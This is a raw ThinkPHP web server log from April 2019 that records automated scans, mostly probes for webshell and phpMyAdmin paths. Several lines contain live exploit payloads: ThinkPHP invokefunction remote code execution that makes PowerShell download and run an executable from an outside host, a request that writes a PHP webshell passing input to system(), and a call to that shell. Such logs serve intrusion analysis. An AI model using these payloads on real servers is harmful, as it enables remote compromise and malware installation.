[ 2019-04-16T03:54:14+08:00 ] 80.82.70.187 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000216s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T10:48:56+08:00 ] 103.45.103.200 /phpMyAdmin/%20index.PhP
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000271s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:PhpMyAdmin

[ 2019-04-16T10:48:56+08:00 ] 103.45.103.200 /phpMyAdmin/%20index.PhP
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000237s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T11:33:01+08:00 ] 54.36.149.85 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000344s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Robots

[ 2019-04-16T12:20:09+08:00 ] 47.93.206.107 /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/pqpaywfcamjurpm3072.exe');start%20C:/Windows/temp/pqpaywfcamjurpm3072.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000220s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:20:09+08:00 ] 47.93.206.107 /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:20:09+08:00 ] 47.93.206.107 /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/pqpaywfcamjurpm3072.exe');start%20C:/Windows/temp/pqpaywfcamjurpm3072.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000198s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000270s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Robots

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000223s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /App5efc5d2f.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /help.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000217s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /java.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /_query.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /test.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000234s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /db_cts.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000231s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /db_pma.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000259s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /logon.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000217s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /help-e.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /license.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000232s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /log.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000235s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /hell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000309s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /pmd_online.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000221s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /shell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000246s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /htdocs.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /b.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000224s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /desktop.ini.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000239s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /z.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000229s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /lala.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000238s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /lala-dpr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000234s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /wpc.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000262s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:26:59+08:00 ] 188.131.176.138 /wpo.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000226s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /t6nv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000230s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /muhstik.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000300s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /text.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /wp-config.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000451s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /muhstik.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000232s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /muhstik2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000220s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /muhstiks.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000222s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /muhstik-dpr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000282s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /lol.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000236s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /uploader.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000228s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /cmd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000332s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:00+08:00 ] 188.131.176.138 /cmv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000343s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:01+08:00 ] 188.131.176.138 /cmdd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000240s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:01+08:00 ] 188.131.176.138 /knal.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000236s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:01+08:00 ] 188.131.176.138 /cmd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000351s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:01+08:00 ] 188.131.176.138 /shell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000234s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:01+08:00 ] 188.131.176.138 /appserv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:01+08:00 ] 188.131.176.138 /scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000269s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:01+08:00 ] 188.131.176.138 /phpmyadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /phpmyadmin/scripts/db___.init.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /phpMyAdmin/scripts/db___.init.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000230s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /plugins/weathermap/editor.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000232s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /cacti/plugins/weathermap/editor.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000353s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%4Äñò
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000291s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Index

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%4Äñò
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000228s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /d7.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000218s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /rxr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000274s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /1x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /home.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /undx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000221s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /spider.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000239s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /payload.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /composers.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000227s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /izom.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /composer.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /hue2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /Drupal.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000211s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /lang.php?f=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000320s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /izom.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000223s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /payload.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000216s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /new_license.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000227s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /images/!.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /images/vuln.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000233s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:03+08:00 ] 188.131.176.138 /up.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000235s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /wuwu11.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000294s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /xw.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /xw1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000278s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /9678.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000223s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /wc.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000230s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /xx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000230s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /xx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000230s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /s.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000263s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /w.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000268s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /sheep.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /qaq.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /my.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000223s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /qq.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T12:27:07+08:00 ] 188.131.176.138 /aaa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000231s ]
